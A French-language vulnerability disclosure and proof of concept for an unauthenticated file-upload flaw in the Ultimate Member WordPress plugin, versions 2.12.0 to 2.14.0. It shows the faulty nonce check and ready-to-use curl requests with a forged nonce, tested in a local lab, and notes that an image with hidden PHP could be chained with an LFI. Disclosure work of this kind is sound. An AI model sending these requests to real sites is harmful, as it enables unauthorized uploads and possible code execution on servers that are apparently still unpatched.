---
title: "PoC Ultimate Member 2.12.0+"
description: "Comment une faille de vérification de nonce dans le plugin WordPress Ultimate Member permet d'uploader des fichiers sans authentification, de la 2.12.0 à la 2.14.0."
date: 2026-10-10 09:00:00 +0200
categories: [Web]
tags: [wordpress, cve]
---

# PoC Ultimate Member 2.12.0

```
- [2026-05-01~2026-05-30] Découverte de la faille
- [2026-06-15] Demande de CVE
- [2026-06-15] Mail envoyé à l'administrateur du GitHub du plugin, avec explication de la faille et proposition de correctif | Aucune réponse reçue
- [2026-08-26] Réponse de CVE
- [2026-08-26] Envoi d'un mail à WPScan
- [2026-10-10] Publication de la faille
- [2026] À suivre...
```

**TL;DR :** le plugin WordPress Ultimate Member (de la 2.12.0 à la 2.14.0, la dernière version en date) contient une faille dans sa vérification de nonce qui permet à n'importe quel visiteur non authentifié d'uploader des fichiers sur le serveur. Cet article explique la faille dans le code, puis la démontre avec un PoC testé sur deux versions du plugin.

### Ultimate Member

Ultimate Member est un plugin WordPress utilisé pour gérer les profils utilisateurs et l'adhésion à un site WordPress. Cette adhésion est facilitée grâce à des formulaires que l'on peut facilement mettre en place.

Plusieurs options sont comprises avec ce plugin :

- Profils utilisateurs frontaux
- Enregistrement des utilisateurs frontaux
- Connexion utilisateur front-end
- Champs de formulaire personnalisés
- Logique conditionnelle pour les corps de formulaire
- Générateur de formulaires glisser-déposer
- Page du compte utilisateur
- Rôles utilisateur personnalisés
- Annuaires des membres
- Courriels utilisateurs
- Restriction de contenu
- Menus de navigation conditionnels
- Afficher les publications et commentaires des auteurs sur les profils utilisateurs
- Adapté aux développeurs avec des dizaines d'actions et de filtres

Vous pouvez retrouver toutes les fonctionnalités du plugin sur le site d'[Ultimate Member](https://ultimatemember.com/?referrer=wordpress.com).

### Analyse

Ultimate Member permet de faire beaucoup de choses. Je me suis intéressé aux formulaires que l'on rencontre régulièrement sur des sites WordPress. Ces formulaires peuvent permettre l'upload de fichiers, en fonction du paramétrage défini par les administrateurs. Les fichiers uploadés sont normalement traités et filtrés avant d'être envoyés sur le site. Mais certaines choses ne fonctionnent pas aussi bien que prévu.

En regardant dans le code, et en suivant le chemin emprunté par les fichiers uploadés ainsi que les fonctions associées, on peut observer un problème particulier.

À la ligne 519 du fichier `ultimatemember/includes/core/class-files.php`, dans la fonction `ajax_image_upload()`, on retrouve une condition contenant une faille de sécurité. En effet, la condition indique que si l'on présente un nonce invalide et que l'on n'est pas connecté, aucune erreur n'est déclenchée. Cela pose un gros problème : un attaquant a la possibilité d'uploader une image sans être authentifié, et sans avoir besoin d'un nonce valide. Nous verrons que cela peut s'avérer très utile pour un attaquant souhaitant stocker une image sur un serveur elle pourrait par exemple être exploitée dans une deuxième phase d'attaque, via une LFI permettant d'exécuter le contenu de l'image. Nous y reviendrons plus tard.

```php
if ( ! wp_verify_nonce( $nonce, "um_upload_nonce-{$timestamp}" ) && is_user_logged_in() ) {
  // This nonce is not valid.
  $ret['error'] = esc_html__( 'Invalid nonce', 'ultimate-member' );
  wp_send_json_error( $ret );
}
```

La même erreur a été commise un peu plus loin dans le code. En effet, à la ligne 691 du même fichier `ultimatemember/includes/core/class-files.php`, dans la fonction `ajax_file_upload()`, on retrouve la même faille, posant le même problème sauf que cette fois, on peut uploader n'importe quel fichier.

```php
if ( ! wp_verify_nonce( $nonce, 'um_upload_nonce-' . $timestamp ) && is_user_logged_in() ) {
  // This nonce is not valid.
  $ret['error'] = esc_html__( 'Invalid nonce', 'ultimate-member' );
  wp_send_json_error( $ret );
}
```

Pouvoir uploader un fichier de façon quasiment arbitraire, sans être authentifié et sans nonce valide, pose un gros problème de sécurité. En effet, de nombreux serveurs WordPress sont malheureusement mal configurés et traitent certains fichiers qu'ils ne devraient pas traiter. Si les blacklists ou whitelists de types de fichiers sont mal conçues, n'importe quel fichier peut être déposé sur le serveur, et ce très facilement.

### PoC

Le setup est simple : mise en place d'un site WordPress avec l'ajout du plugin Ultimate Member. Rien d'autre n'est nécessaire, à part la création d'un formulaire. Si vous choisissez d'accepter un fichier de type image (png, etc.), vous devrez appeler la fonction `ajax_image_upload()` via votre requête AJAX. Si vous souhaitez le faire avec un autre type de fichier, vous devrez utiliser la fonction `ajax_file_upload()`.

Une fois l'environnement en place, on peut l'attaquer. Deux solutions s'offrent à nous : utiliser BurpSuite pour observer le fonctionnement de la requête, ou directement forger la requête et uploader notre fichier.

**Fonctionnement**: Utiliser BurpSuite pour intercepter une requête légitime, l'analyser, puis en modifier certains paramètres.

**Forge**: Pour forger notre requête, on a besoin de certains paramètres que l'on peut retrouver directement dans le code source.

Le fait de pouvoir uploader des images et de les stocker temporairement sur un serveur pose un vrai problème : on peut y cacher du PHP, et une faille de type LFI ailleurs sur le même site WordPress via un autre plugin vulnérable, par exemple pourrait alors permettre d'exécuter ce code PHP caché dans l'image.

### Setup

J'utilise un `docker-compose.yml` qui me permet d'avoir un WordPress 7.0 avec le plugin Ultimate Member 2.12.0. Nous avons donc notre lab en local, et pouvons passer à la configuration du plugin. Il nous faut créer un formulaire exploitant les deux fonctions qui posent problème : je crée donc simplement un formulaire username/password avec un champ pour une image, puis je refais la même chose sur une autre page, cette fois avec la fonction d'upload de fichier.

Attention à ne pas oublier de lier les pages avec le shortcode `[ultimatemember form_id="1"]`.

Nous pouvons maintenant tenter d'exploiter la faille. Pour construire une requête AJAX correcte, il nous faut récupérer différents paramètres et valeurs, que l'on retrouve très facilement dans le DOM.

**Requête légitime :**
```bash
curl -s -X POST "http://localhost:8080/wp-admin/admin-ajax.php" -F "action=um_imageupload" -F "_wpnonce=08f63b7c4c" -F "set_id=14" -F "set_mode=register" -F "key=profile_img" -F "profile_img=@/home/belly/Pictures/pp/Fairy.jpg"
```

**Réponse :**
```bash
{"success":true,"data":[{"file":"stream_photo_26cb5d3e3717a28b64bf2b2896b2ba6abec016c4.jpg","url":"http:\/\/localhost:8080\/wp-content\/uploads\/ultimatemember\/temp\/stream_photo_26cb5d3e3717a28b64bf2b2896b2ba6abec016c4.jpg","type":"image\/jpeg","file_info":{"basename":"stream_photo_26cb5d3e3717a28b64bf2b2896b2ba6abec016c4.jpg","name":"http:\/\/localhost:8080\/wp-content\/uploads\/ultimatemember\/temp\/stream_photo_26cb5d3e3717a28b64bf2b2896b2ba6abec016c4.jpg","original_name":"Fairy.jpg","ext":"jpg","type":"image\/jpeg","size":40618,"size_format":"40 KB"}}]}
```

| Paramètre curl | Source dans le DOM |
|---|---|
| `action=um_imageupload` | Convention WordPress AJAX + source JS du plugin |
| `_wpnonce=08f63b7c4c` | `data-nonce="08f63b7c4c"` |
| `set_id=14` | `data-set_id="14"` |
| `set_mode=register` | `data-set_mode="register"` |
| `key=profile_img` | `data-key="profile_img"` |
| `profile_img=@fichier` | `data-key="profile_img"` le nom du champ fichier = la key |

Nous avons donc effectué une requête légitime en passant par `admin-ajax.php`. Voyons maintenant si le fait de changer le nonce nous bloque réellement : mettons une valeur absurde.

**Requête avec un nonce invalide (`dinosaur`) :**
```bash
curl -s -X POST "http://localhost:8080/wp-admin/admin-ajax.php" -F "action=um_imageupload" -F "_wpnonce=dinosaur" -F "set_id=14" -F "set_mode=register" -F "key=profile_img" -F "profile_img=@/home/belly/Pictures/pp/Fairy.jpg"
```

**Réponse :**
```bash
{"success":true,"data":[{"file":"stream_photo_d0a9371db45399589a35569a937141a60d3d1054.jpg","url":"http:\/\/localhost:8080\/wp-content\/uploads\/ultimatemember\/temp\/stream_photo_d0a9371db45399589a35569a937141a60d3d1054.jpg","type":"image\/jpeg","file_info":{"basename":"stream_photo_d0a9371db45399589a35569a937141a60d3d1054.jpg","name":"http:\/\/localhost:8080\/wp-content\/uploads\/ultimatemember\/temp\/stream_photo_d0a9371db45399589a35569a937141a60d3d1054.jpg","original_name":"Fairy.jpg","ext":"jpg","type":"image\/jpeg","size":40618,"size_format":"40 KB"}}]}
```

Malgré un nonce totalement invalide, la requête réussit : je ne suis pas authentifié, et pourtant j'ai la possibilité d'uploader une image de façon temporaire sur le serveur.

Faisons maintenant la même chose avec la fonction `ajax_file_upload()`. Après avoir créé la page et observé son rendu dans le DOM, on peut refaire le même mappage des paramètres.

| Paramètre curl | Source dans le DOM |
|---|---|
| `action=um_fileupload` | Convention WordPress AJAX + source JS du plugin |
| `_wpnonce=64d15d5d94` | `data-nonce="64d15d5d94"` |
| `set_id=21` | `data-set_id="21"` |
| `set_mode=register` | `data-set_mode="register"` |
| `key=user_file` | `data-key="user_file"` |
| `user_file=@fichier` | `data-key="user_file"` le nom du champ fichier = la key |

Nous pouvons donc adapter notre commande curl et retenter de manipuler le nonce.

**Requête légitime :**
```bash
curl -s -X POST "http://localhost:8080/wp-admin/admin-ajax.php" -F "action=um_fileupload" -F "_wpnonce=64d15d5d94" -F "set_id=21" -F "set_mode=register" -F "key=user_file" -F "user_file=@/home/belly/test.txt;type=text/plain"
```

**Réponse :**
```bash
{"success":true,"data":{"url":"http:\/\/localhost:8080\/wp-content\/uploads\/ultimatemember\/temp\/file_8314855557f3bcdb15d6f97877fb7677ee15d654.txt","icon":"um-faicon-file-text-o","icon_bg":"#666","filename":"file_8314855557f3bcdb15d6f97877fb7677ee15d654.txt","original_name":"test.txt"}}
```

**Requête avec un nonce invalide (`dinosaur`) :**
```bash
curl -s -X POST "http://localhost:8080/wp-admin/admin-ajax.php" -F "action=um_fileupload" -F "_wpnonce=dinosaur" -F "set_id=21" -F "set_mode=register" -F "key=user_file" -F "user_file=@/home/belly/test.txt;type=text/plain"
```

**Réponse :**
```bash
{"success":true,"data":{"url":"http:\/\/localhost:8080\/wp-content\/uploads\/ultimatemember\/temp\/file_1509530cbf988d48025a1fc44f2bcb8f767c1004.txt","icon":"um-faicon-file-text-o","icon_bg":"#666","filename":"file_1509530cbf988d48025a1fc44f2bcb8f767c1004.txt","original_name":"test.txt"}}
```

Nous pouvons donc également stocker un fichier de façon temporaire sur un serveur, sans authentification. On peut aussi observer que chaque réponse contient le chemin complet du fichier uploadé.

---

*Note : le PoC ci-dessus a été réalisé et testé initialement sur la version 2.12.0 du plugin. Le même test a ensuite été rejoué sur la version 2.14.0 (la plus récente à ce jour, sur WordPress 7.1.3) : un nonce totalement invalide (`dinosaur`) a de nouveau suffi à faire aboutir l'upload sur `ajax_image_upload()` comme sur `ajax_file_upload()`, sans authentification. La faille est donc confirmée par un test réel sur les deux versions, et non une simple analyse de code.*
